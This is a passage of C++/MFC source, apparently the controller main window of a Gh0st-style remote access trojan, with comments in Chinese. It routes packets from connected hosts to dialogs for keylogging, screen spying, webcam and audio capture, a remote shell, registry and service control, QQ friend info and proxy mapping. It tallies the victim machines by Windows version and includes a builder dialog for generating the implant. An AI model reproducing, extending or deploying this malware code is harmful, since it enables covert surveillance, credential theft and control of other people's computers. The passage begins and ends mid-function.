			break;
		case REGEDIT_DLG:
			((CRegeditDlg *)dlg)->OnReceiveComplete();
			break;
		case CHAT_DLG:
			((CTextChatDlg *)dlg)->OnReceiveComplete();
			break;
		case QQINFO_DLG:
			((CQQInfoDlg *)dlg)->OnReceiveComplete();
			break;
		case PROXYMAP_DLG:
			((CProxyMapDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_LOGIN: // 上线包
		{
			pContext->m_bIsMainSocket = true;
			g_SuperGrid->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
		/*	pContext->m_bIsMainSocket = TRUE;
			g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);*/
		}
		break;
	case TOKEN_DRIVE_LIST: // 文件管理 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pFrame->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: // 屏幕查看
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START://键盘记录
		g_pFrame->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pFrame->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pFrame->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START: //远程终端
		g_pFrame->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SYSTEMINFO: //系统信息
		g_pFrame->PostMessage(WM_OPENSYSTEMINFODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:     // 系统管理
		g_pFrame->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SERVICE_LIST://服务管理
		g_pFrame->PostMessage(WM_OPENSERVICEDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:   //注册表管理    
		g_pFrame->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_TEXTCHAT_START://远程聊天
		g_pFrame->PostMessage(WM_OPENTEXTCHATDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_QQINFO://好友信息
		g_pFrame->PostMessage(WM_OPENQQINFODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PROXY_START://代理映射
		g_pFrame->PostMessage(WM_OPENPROXYMAPDIALOG, 0, (LPARAM)pContext);
		break;
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}


// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::OnCustomize()
{
	// get a pointer to the command bars object.
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if (pCommandBars == NULL)
		return;
	
	// instanciate the customize dialog
	CXTPCustomizeSheet dlg(pCommandBars);
	
	// add the options page to the customize dialog.
	CXTPCustomizeOptionsPage pageOptions(&dlg);
	dlg.AddPage(&pageOptions);
	
	// add the commands page to the customize dialog.
	CXTPCustomizeCommandsPage* pPageCommands = dlg.GetCommandsPage();
	pPageCommands->AddCategories(IDR_MAINFRAME);
	
	// initialize the commands page page.
	pPageCommands->InsertAllCommandsCategory();
	pPageCommands->InsertBuiltInMenus(IDR_MAINFRAME);
	pPageCommands->InsertNewMenuCategory();
	
	// display the customize dialog.
	dlg.DoModal();
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		
		MinTray=TRUE;  //最小托盘状态
		m_TrayIcon.MinimizeToTray(this);
	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}
}



void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	
#ifdef NDEBUG
	if (MessageBox(_T("确定退出?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
 		return;
#endif

	SaveCommandBars("CommandBars");

	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	pMainFrame->m_TrayIcon.RemoveIcon();
	
	if (NULL!=m_iocpServer)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	
	///////////////////////托盘图标删除
	NOTIFYICONDATA tnd;
	tnd.cbSize=sizeof(NOTIFYICONDATA);
	tnd.hWnd=AfxGetMainWnd()->m_hWnd;
	tnd.uID=IDR_MAINFRAME;//保证删除的是我们的图标
	Shell_NotifyIcon(NIM_DELETE,&tnd);
	///////////////////////////////
	
	KillTimer(0);  //关闭定时器 
	
	CXTPFrameWnd::OnClose();
}

void CMainFrame::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	
	switch(nIDEvent)
	{
	case 0:
		{
			CString str1,str2;
			str1.Format("发送: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024);
			str2.Format("接收: %.2f kb/s", (float)m_iocpServer->m_nRecvKbps / 1024);
			m_wndStatusBar.SetPaneText(1, str1);
			m_wndStatusBar.SetPaneText(2, str2);
			m_iocpServer->m_nSendKbps = 0;
			m_iocpServer->m_nRecvKbps = 0;

			NotifyIconTip();   //托盘信息显示
			Shell_NotifyIcon(NIM_MODIFY,&m_NotifyIcon);

		}
		break;
	default:
		break;
	}
	
	CXTPFrameWnd::OnTimer(nIDEvent);
}

LRESULT CMainFrame::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{	

	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;

	CPcView* pView = NULL;
	CString strOSCount,strLogText;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	bool bIsOk = false;

//	for (int n = 0; n < nTabs; n++ )
//	{
//		try
//		{
//			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
//
//			int nCnt = pView->->GetItemCount();
//			for (int i=0; i < nCnt; i++)
//			{
//				if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
//				{
//					bIsOk = true;
//
//					strLogText.Format( "主机下线: [%s]  -   系统:[%s]  -   地理位置:[%s]",pView->m_pListCtrl->GetItemText(i, 2),pView->m_pListCtrl->GetItemText(i, 5),pView->m_pListCtrl->GetItemText(i, 0));
//					g_pLogView->InsertLogItem(strLogText, 0, 2);
//
//					strOSCount = pView->m_pListCtrl->GetItemText( i, 5 );
//					if ( strOSCount.Find(_T("WinNT")) != -1 )
//					{
//						g_pFrame->nOSCount[0]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					if ( strOSCount.Find(_T("Win2000")) != -1 )
//					{
//						g_pFrame->nOSCount[1]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					if ( strOSCount.Find(_T("WinXP")) != -1 )
//					{
//						g_pFrame->nOSCount[2]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					if ( strOSCount.Find(_T("Win2003")) != -1 )
//					{
//						g_pFrame->nOSCount[3]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					if ( strOSCount.Find(_T("WinVista")) != -1 )
//					{
//						g_pFrame->nOSCount[4]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					if ( strOSCount.Find(_T("Win2008")) != -1 )
//					{
//						g_pFrame->nOSCount[5]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					if ( strOSCount.Find(_T("Win7")) != -1 )
//					{
//						g_pFrame->nOSCount[6]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					if ( strOSCount.Find(_T("Win8")) != -1 )
//					{
//						g_pFrame->nOSCount[7]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					if ( strOSCount.Find(_T("Win2012")) != -1 )
//					{
//						g_pFrame->nOSCount[8]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					if ( strOSCount.Find(_T("Win10")) != -1 )
//					{
//						g_pFrame->nOSCount[9]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					if ( strOSCount.Find(_T("Win2016")) != -1 )
//					{
//						g_pFrame->nOSCount[10]--;
//						g_pFrame->nOSCount[11]--;
//					}
//					
//					pView->m_pListCtrl->DeleteItem(i);
//					PlaySound(MAKEINTRESOURCE(IDR_WAVE1),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
//					break;		
//				}
//			}		
//
//
//	// 关闭相关窗口
//	switch (pContext->m_Dialog[0])
//	{
//	case FILEMANAGER_DLG:
//	case SCREENSPY_DLG:
//	case KEYBOARD_DLG:
//	case WEBCAM_DLG:
//	case AUDIO_DLG:
//	case SHELL_DLG:
//	case SYSTEMINFO_DLG:
//	case SYSTEM_DLG:
//	case SERVICE_DLG:
//	case REGEDIT_DLG:
//	case CHAT_DLG:
//	case QQINFO_DLG:
//	case PROXYMAP_DLG:
//		((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
//		break;
//	default:
//		break;
//	}
//	}catch(...){}
//	
//}
//	if(bIsOk == false)
//		TRACE("没有找到要删除的主机\r\n");

	
	// 更新当前连接总数
	g_pFrame->ShowOSCount();//统计
	g_pFrame->ShowConnectionsNumber();
	g_pTabView->UpDateNumber();
	
	return 0;
}
void CMainFrame::ShowConnectionsNumber()
{
	CString str,strTemp;
	int a = 0;
	CPcView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{	
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		//a += pView->m_pListCtrl->GetItemCount();
	}
	str.Format(_T("合计: %d台"), a);

	Host=a;
	NotifyIconTip();   //托盘信息显示
	Shell_NotifyIcon(NIM_MODIFY,&m_NotifyIcon);

	UpdateData();
	
	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	ASSERT_VALID(pMainFrame);
	pMainFrame->m_TrayIcon.SetTooltipText(str);
}

void CMainFrame::ShowOSCount()
{
	CString str;
	str.Format(_T("主机统计:NT:%d  Win2000:%d  WinXP:%d  Win2003:%d  Vista:%d  Win2008:%d  Win7:%d  Win8:%d  Win2012:%d  Win10:%d  Win2016:%d  -> 合计: %d台"),  
		nOSCount[0],
		nOSCount[1], 
		nOSCount[2],
		nOSCount[3],
		nOSCount[4],
		nOSCount[5],
		nOSCount[6],
		nOSCount[7],
		nOSCount[8],
		nOSCount[9],
		nOSCount[10],
		nOSCount[11]);
	m_wndStatusBar.SetPaneText(0, str);
}


CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
	//做个标记
	int nID = ++m_nCount;
	
	CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);
	
	CString strTitle;
	strTitle.Format(strFormat, nID);
	pwndPane->SetTitle(strTitle);
	pwndPane->SetIconID(nID % 6 + 1);
	
	CXTPFrameWnd* pFrame = new CXTPFrameWnd;
	
	CCreateContext context;
	context.m_pNewViewClass = pNewViewClass;
	context.m_pCurrentDoc = GetActiveView()->GetDocument();
	
	pFrame->Create(NULL, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
	pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);
	
	m_mapPanes.SetAt(nID, pFrame);
	
	return pwndPane;
}

LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
	if (wParam == XTP_DPN_SHOWWINDOW)
	{
		// get a pointer to the docking pane being shown.
		CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
		if (!pPane->IsValid())
		{
			CWnd* pWnd = NULL;
			if (m_mapPanes.Lookup(pPane->GetID(), pWnd))
			{
				pPane->Attach(pWnd);
			}
		}
		
		return TRUE; // handled
	}
	return FALSE;
}

void CMainFrame::OnBuild() 
{
	// TODO: Add your command handler code here
	CGenerate dlg;
	dlg.DoModal();
}

void CMainFrame::OnSetting() 
{
	// TODO: Add your command handler code here
	CSetting dlg;
	dlg.DoModal();
}

LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{	
	ClientContext *pContext = (ClientContext *)lParam;
	
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	
	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
	
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenSysteminfoDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSysteminfo	*dlg = new CSysteminfo(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEMINFO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEMINFO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}



LRESULT CMainFrame::OnOpenServiceDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CServiceDlg	*dlg = new CServiceDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SERVICE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = SERVICE_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)    //注册表
{
    ClientContext	*pContext = (ClientContext *)lParam;
	CRegeditDlg	*dlg = new CRegeditDlg(this, m_iocpServer, pContext);

	//设置父窗口为卓面
    dlg->Create(IDD_REGEDIT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

#include "InputDlg.h"
LRESULT CMainFrame::OnOpenTextChatDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CTextChatDlg	*dlg = new CTextChatDlg(this, m_iocpServer, pContext);
	
	CInputDialog Indlg;
	Indlg.Init("请输入聊天昵称", _T("点取消默认昵称为(外星人)ET:"), this);
	if (Indlg.DoModal() != IDOK)   
		dlg->strName = "ET:\r\n"; 
	else
		dlg->strName.Format("%s:\r\n",Indlg.m_str.GetBuffer(0)); 
	
	// 设置父窗口为卓面
	dlg->Create(IDD_TEXTCHAT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = CHAT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenQqinfoDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CQQInfoDlg	*dlg = new CQQInfoDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_QQINFO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = QQINFO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

LRESULT CMainFrame::OnOpenProxyMapDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CProxyMapDlg	*dlg = new CProxyMapDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_PROXY_MAP, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = PROXYMAP_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

void CMainFrame::OnUpdateOptionsStyle(CCmdUI* pCmdUI)
{
	pCmdUI->SetCheck(pCmdUI->m_nID == m_nRibbonStyle ? 1 : 0);
	
}
BOOL CMainFrame::CreateRibbonBar()
{
	CXTPCommandBars* pCommandBars = GetCommandBars();
	
	
	CMenu menu;
	menu.Attach(::GetMenu(m_hWnd));
	SetMenu(NULL);
	
	
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)pCommandBars->Add(_T("欢迎使用本远程管理系统"), xtpBarTop, RUNTIME_CLASS(CXTPRibbonBar));
	if (!pRibbonBar)
	{
		return FALSE;
	}
	
	CXTPControlPopup* pControlFile = (CXTPControlPopup*)pRibbonBar->AddSystemButton(IDR_MENU_LIST);
	pControlFile->SetCommandBar(menu.GetSubMenu(0));
	pControlFile->GetCommandBar()->SetIconSize(CSize(16, 16));
	pRibbonBar->EnableDocking(0);
//	pControlFile->SetIconId(IDR_MAINFRAME);

/*	CXTPRibbonTab* pTabHome = pRibbonBar->AddTab(_T("功能"));
	CXTPRibbonGroup* pGroupFile = pTabHome->AddGroup(_T("功能区域"));
	pGroupFile->Add(xtpControlButton, IDM_FILEMANAGER);
	pGroupFile->Add(xtpControlButton, IDM_SCREENSPY);
	pGroupFile->Add(xtpControlButton, IDM_SYSTEM);
	pGroupFile->Add(xtpControlButton, IDM_WEBCAM);
	pGroupFile->Add(xtpControlButton, IDM_SHELL);
	pGroupFile->Add(xtpControlButton, IDM_AUDIO);
	pGroupFile->Add(xtpControlButton, IDM_KEYBOARD);
	pGroupFile->Add(xtpControlButton, IDM_SERVICE);
	pGroupFile->Add(xtpControlButton, IDM_REGEDIT);*/

/*	CXTPRibbonTab* pTabHome2 = pRibbonBar->AddTab(_T("生成"));
	CXTPRibbonGroup* pGroupFile2 = pTabHome2->AddGroup(_T("上线设置"));
	pGroupFile2->Add(xtpControlButton, ID_SETTING);
	pGroupFile2->Add(xtpControlButton, ID_BUILD);
	pGroupFile2->Add(xtpControlButton, ID_APP_ABOUT);
	pGroupFile2->Add(xtpControlButton, ID_APP_EXIT);//退出程序*/

	CXTPControlPopup* pControlOptions = (CXTPControlPopup*)pRibbonBar->GetControls()->Add(xtpControlPopup, -1);
	pControlOptions->SetFlags(xtpFlagRightAlign);
    CMenu mnuOptions;
	mnuOptions.LoadMenu(IDR_MENU_OPTIONS);
	pControlOptions->SetCommandBar(mnuOptions.GetSubMenu(0));
	pControlOptions->SetCaption(_T("风格切换"));
	pRibbonBar->GetQuickAccessControls()->RemoveAll();
	pRibbonBar->GetQuickAccessControls()->CreateOriginalControls();
	pRibbonBar->EnableFrameTheme();
	return TRUE;
}


void CMainFrame::OnOptionsStyle(UINT nStyle)
{
	GetCommandBars()->SetTheme(xtpThemeRibbon);
	
	HMODULE hModule = AfxGetInstanceHandle();
	
	LPCTSTR lpszIniFile = 0;
	switch (nStyle)
	{
	case ID_OPTIONS_STYLEBLUE2007: 
		hModule = LoadLibrary(m_csStylesPath + _T("Office2007.dll"));
		lpszIniFile = _T("OFFICE2007BLUE.INI"); 
		break;
		
	case ID_OPTIONS_STYLEBLACK2007: 
		hModule = LoadLibrary(m_csStylesPath + _T("Office2007.dll"));
		lpszIniFile = _T("OFFICE2007BLACK.INI"); 
		break;
		
	case ID_OPTIONS_STYLEAQUA2007: 
		hModule = LoadLibrary(m_csStylesPath + _T("Office2007.dll"));
		lpszIniFile = _T("OFFICE2007AQUA.INI"); 
		break;
		
	case ID_OPTIONS_STYLESILVER2007: 
		hModule = LoadLibrary(m_csStylesPath + _T("Office2007.dll"));
		lpszIniFile = _T("OFFICE2007SILVER.INI"); 
		break;
		
	case ID_OPTIONS_STYLESCENIC7: 
		hModule = LoadLibrary(m_csStylesPath + _T("Windows7.dll"));
		lpszIniFile = _T("WINDOWS7BLUE.INI"); 
		break;
		
	case ID_OPTIONS_STYLESILVER2010: 
		hModule = LoadLibrary(m_csStylesPath + _T("Office2010.dll"));
		lpszIniFile = _T("OFFICE2010SILVER.INI"); 
		break;
		
	case ID_OPTIONS_STYLEBLUE2010: 
		hModule = LoadLibrary(m_csStylesPath + _T("Office2010.dll"));
		lpszIniFile = _T("OFFICE2010BLUE.INI"); 
		break;
		
	case ID_OPTIONS_STYLEBLACK2010: 
		hModule = LoadLibrary(m_csStylesPath + _T("Office2010.dll"));
		lpszIniFile = _T("OFFICE2010BLACK.INI"); 
		break;
		
	}
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Ribbon", "Style",nStyle);

	if (hModule != 0)
	{
		((CXTPOffice2007Theme*)GetCommandBars()->GetPaintManager())->SetImageHandle(hModule, lpszIniFile);
	}
	
	m_paneManager.SetTheme(xtpPaneThemeOffice2007Word);
	m_paneManager.GetPaintManager()->RefreshMetrics();
	m_paneManager.RedrawPanes();
	
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetMenuBar();
	
	if (nStyle >= ID_OPTIONS_STYLESCENIC7 && nStyle <= ID_OPTIONS_STYLEBLACK2010)
	{
		pRibbonBar->GetSystemButton()->SetStyle(xtpButtonCaption);

	}
	else
	{
		pRibbonBar->GetSystemButton()->SetStyle(xtpButtonAutomatic);
	}
	
	
	GetCommandBars()->GetImageManager()->RefreshAll();
	GetCommandBars()->RedrawCommandBars();
	SendMessage(WM_NCPAINT);
	
	RedrawWindow(0, 0, RDW_ALLCHILDREN|RDW_INVALIDATE);
	
	
	
	m_nRibbonStyle = nStyle;
}



BOOL CMainFrame::CreateMessageBar(char* lpszMessage)
{
	if (!m_wndMessageBar.Create(GetCommandBars()))
		return FALSE;
	


	m_wndMessageBar.EnableMarkup();
	m_wndMessageBar.SetMessage(_T(lpszMessage));
	return TRUE;
}

void CMainFrame::OnAutoResizeIcons()
{
	GetCommandBars()->GetPaintManager()->m_bAutoResizeIcons ^= 1;
	GetCommandBars()->RedrawCommandBars();
}

void CMainFrame::OnUpdateAutoResizeIcons(CCmdUI* pCmdUI)
{
	pCmdUI->SetCheck(GetCommandBars()->GetPaintManager()->m_bAutoResizeIcons);
}
int nFonts[] = {0, 11, 13, 16};

void CMainFrame::OnOptionsFont(UINT nID)
{
	int nFontHeight = nFonts[nID - ID_OPTIONS_FONT_SYSTEM];
	
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);
	
	pRibbonBar->SetFontHeight(nFontHeight);
	
}

void CMainFrame::OnUpdateOptionsFont(CCmdUI* pCmdUI)
{
	int nFontHeight = nFonts[pCmdUI->m_nID - ID_OPTIONS_FONT_SYSTEM];
	
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);
	
	pCmdUI->SetCheck(pRibbonBar->GetFontHeight() == nFontHeight ? TRUE : FALSE);
	
}

void CMainFrame::OnFrameTheme()
{
	ShowWindow(SW_NORMAL);
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);
	
	CXTPWindowRect rc(this);
	rc.top += (pRibbonBar->IsFrameThemeEnabled() ? -1 : +1) * GetSystemMetrics(SM_CYCAPTION);
	MoveWindow(rc);
	
	pRibbonBar->EnableFrameTheme(!pRibbonBar->IsFrameThemeEnabled());
	
}

void CMainFrame::OnUpdateFrameTheme(CCmdUI* pCmdUI)
{
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);
	
	pCmdUI->SetCheck(pRibbonBar->IsFrameThemeEnabled() ? TRUE : FALSE);
}

void CMainFrame::OnOptionsSystem()
{
	
	GetCommandBars()->SetTheme(xtpThemeOfficeXP);
	GetCommandBars()->GetPaintManager()->GetIconsInfo()->bUseFadedIcons = FALSE;
	GetCommandBars()->GetPaintManager()->GetIconsInfo()->bIconsWithShadow = FALSE;
	GetCommandBars()->GetPaintManager()->GetIconsInfo()->bUseDisabledIcons = TRUE;
	
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetMenuBar();
	pRibbonBar->GetSystemButton()->SetStyle(xtpButtonAutomatic);
	
	if (XTPSystemVersion()->IsWinVistaOrGreater())
	{
		GetCommandBars()->GetPaintManager()->m_bUseOfficeFont = TRUE;
		GetCommandBars()->GetPaintManager()->m_strOfficeFont = _T("Segoe UI");
		GetCommandBars()->GetPaintManager()->SetFontHeight(12);
	}
	
	
	
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2003);
	m_paneManager.GetPaintManager()->RefreshMetrics();
	m_paneManager.RedrawPanes();
	
	GetCommandBars()->GetImageManager()->RefreshAll();
	GetCommandBars()->RedrawCommandBars();
	SendMessage(WM_NCPAINT);
	
	RedrawWindow(0, 0, RDW_ALLCHILDREN|RDW_INVALIDATE);
	
	
	m_nRibbonStyle = ID_OPTIONS_STYLESYSTEM;
}

void CMainFrame::OnSz() //
{
	// TODO: Add your command handler code here
	// 	CSettingDlg dlg;
	// 	dlg.DoModal();
}
void CMainFrame::OnTools() 
{
	// TODO: Add your command handler code here
	CTools dlg;
	dlg.DoModal();
}

LRESULT CMainFrame::OnSystray(WPARAM wParam,LPARAM lParam)
{
	UINT uMouseMsg;//鼠标动作
	uMouseMsg=(UINT)lParam;
	if(uMouseMsg==WM_LBUTTONDOWN)//如果是单击右键
	{
		OnShowStr();
	}
	
	if(uMouseMsg==WM_RBUTTONDOWN)
	{
		AfxGetMainWnd()->SetForegroundWindow(); 
		
		CMenu menu;//弹出Popup菜单
		menu.LoadMenu(IDR_MINIMIZE);
		CMenu* pPopup=menu.GetSubMenu(0);
		
		CString stro;
		BOOL a_chkm = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "PopTips", false);
		if(!a_chkm)
			stro = "关闭消息提示";
		else
			stro = "开启消息提示";
		pPopup->ModifyMenu(0,MF_BYPOSITION | MF_STRING|MF_POPUP,IDM_NEWSTIPS, stro);
		
		
		
		a_chkm = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Sound", false);
		if(a_chkm)
			stro = "关闭语音提示";
		else
			stro = "开启语音提示";
		pPopup->ModifyMenu(1,MF_BYPOSITION | MF_STRING|MF_POPUP,IDM_VOICEPROMPT, stro);
		
		if(MinTray == NULL)
		{
			stro = "隐藏至托盘";
		}
		else
		{
			stro = "打开主面板";
		}
		pPopup->ModifyMenu(3,MF_BYPOSITION | MF_STRING|MF_POPUP,IDM_SHOW, stro);
		
